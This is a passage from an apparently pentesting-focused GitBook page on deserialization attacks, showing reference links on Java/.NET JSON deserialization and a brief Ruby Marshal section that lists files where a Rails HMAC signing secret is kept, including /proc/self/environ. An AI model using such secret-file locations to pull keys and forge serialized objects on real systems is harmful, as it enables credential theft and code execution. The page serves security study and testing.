<li>Java and .Net JSON deserialization <strong>paper:</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf" target="_blank"><strong>https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</strong></a><strong>,</strong> talk: <a href="https://www.youtube.com/watch?v=oUAeWhW5b8c" target="_blank">https://www.youtube.com/watch?v=oUAeWhW5b8c</a> and slides: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf" target="_blank">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp" target="_blank">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp</a></li>
<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf" target="_blank">https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf</a></li>
<li><a href="https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization" target="_blank">https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization</a></li>
</ul>
<h2 id="ruby"><strong>Ruby</strong></h2>
<p>Ruby has two methods to implement serialization inside the <strong>marshal</strong> library: first method is <strong>dump</strong> that converts object into bytes streams <strong>(serialize)</strong>. And the second method is <strong>load</strong> to convert bytes stream to object again (<strong>deserialize</strong>).<br>Ruby uses HMAC to sign the serialized object and saves the key on one of the following files:</p>
<ul>
<li>config/environment.rb</li>
<li>config/initializers/secret_token.rb</li>
<li>config/secrets.yml</li>
<li>/proc/self/environ</li>
</ul>
<p>TODO: Review <a href="https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/" target="_blank">https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/</a></p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../dangling-markup-html-scriptless-injection.html" class="navigation navigation-prev " aria-label="Previous page: Dangling Markup - HTML scriptless injection">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="nodejs-deserialization-__proto__-abuse.html" class="navigation navigation-next " aria-label="Next page: NodeJS deserialization __proto__ abuse">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Deserialization","level":"7.16","depth":1,"next":{"title":"NodeJS deserialization __proto__ abuse","level":"7.16.1","depth":2,"path":"pentesting-web/deserialization/nodejs-deserialization-__proto__-abuse.md","ref":"pentesting-web/deserialization/nodejs-deserialization-__proto__-abuse.md","articles":[]},"previous":{"title":"Dangling Markup - HTML scriptless injection","level":"7.15","depth":1,"path":"pentesting-web/dangling-markup-html-scriptless-injection.md","ref":"pentesting-web/dangling-markup-html-scriptless-injection.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"pentesting-web/deserialization/README.md","mtime":"2020-10-31T13:19:01.463Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-10-31T14:55:56.813Z"},"basePath":"../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../gitbook/gitbook.js"></script>
    <script src="../../gitbook/theme.js"></script>
    
        
        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

